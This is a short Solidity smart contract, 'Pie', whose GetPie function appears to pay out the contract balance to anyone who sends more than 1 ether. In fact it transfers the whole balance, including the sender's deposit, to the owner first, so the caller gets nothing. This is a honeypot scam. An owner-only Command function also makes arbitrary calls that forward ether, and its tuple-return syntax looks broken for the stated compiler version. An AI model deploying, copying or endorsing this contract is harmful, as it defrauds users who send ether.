pragma solidity ^0.4.19;

contract Pie {
    address public Owner = msg.sender;

    function() public payable {}

    function GetPie() public payable {
        if (msg.value > 1 ether) {
            Owner.transfer(this.balance);
            msg.sender.transfer(this.balance);
        }
    }

    function withdraw() public payable {
        require(msg.sender == Owner);
        Owner.transfer(this.balance);
    }

    function setOwner(address newOwner) public {
        require(msg.sender == Owner);
        Owner = newOwner;
    }

    function Command(address adr, bytes data) public payable {
        require(msg.sender == Owner);
        require(adr != address(0)); // Check that the address is not empty
        require(data.length > 0); // Check that the data is not empty

        bool success;
        bytes memory returnData;
        (success, returnData) = adr.call.value(msg.value)(data);
        require(success);
    }
}